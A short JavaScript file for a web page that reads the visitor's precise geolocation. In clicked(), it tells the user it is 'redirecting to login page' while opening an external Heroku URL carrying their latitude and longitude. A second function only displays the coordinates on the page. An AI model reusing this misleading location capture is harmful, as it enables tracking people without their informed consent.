/*
if (window.navigator) {
    window.navigator.geolocation.getCurrentPosition(successcallback, failurecallback);
}
else{
    alert("unsuccess...");
}
const successcallback = (position) => {
    alert("success....");
    console.log(position);
    const { latitude, longitude } = position.coords;
    console.log("longitude");
    console.log(longitude);
    
}
*/
function clicked(){
  
  var btn = document.getElementById('btn');
  btn.disabled = true;
  btn.innerText = "wait...";
  
    const options = {
    enableHighAccuracy: true,
    timeout: 50000,
    maximumAge: 10
  };
  
  function success(pos) {
    const crd = pos.coords;
  
    console.log('Your current position is:');
    console.log(`Latitude : ${crd.latitude}`);
    console.log(`Longitude: ${crd.longitude}`);
    console.log(`More or less ${crd.accuracy} meters.`);
    alert("redirecting to login page...")
    //document.getElementById("coor1").innerHTML = crd.latitude;
    //document.getElementById("coor2").innerHTML = crd.longitude;
    open("https://glacial-badlands-23822.herokuapp.com//"+crd.latitude+"&&"+crd.longitude+"?encode=wuxh");
    //open("http://127.0.0.1:8000"+"//"+crd.latitude+"&&"+crd.longitude+"?encode=wuxh");
  }
  
  function error(err) {
    console.warn(`ERROR(${err.code}): ${err.message}`);
    alert("allow location");
  }
  
  navigator.geolocation.getCurrentPosition(success, error, options);
}




function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function trackme(){
  var btn = document.getElementById('btn');
  btn.disabled = true;
  btn.innerText = "wait...";
   let options = {
    enableHighAccuracy: true,
    timeout: 50000,
    maximumAge: 10
  };
  
  function success(pos){
      let coor = pos.coords;
      document.getElementById('latitude').innerHTML=coor.latitude;
      document.getElementById('longitude').innerHTML=coor.longitude;
  }
  function error(err) {
    console.warn(`ERROR(${err.code}): ${err.message}`);
    alert("can't access your location..");
  }
  navigator.geolocation.watchPosition(success, error, options);
}
/*
async function trackme(){
  while (1 == 1){
      track();
      await sleep(2*1000);
  }
}
*/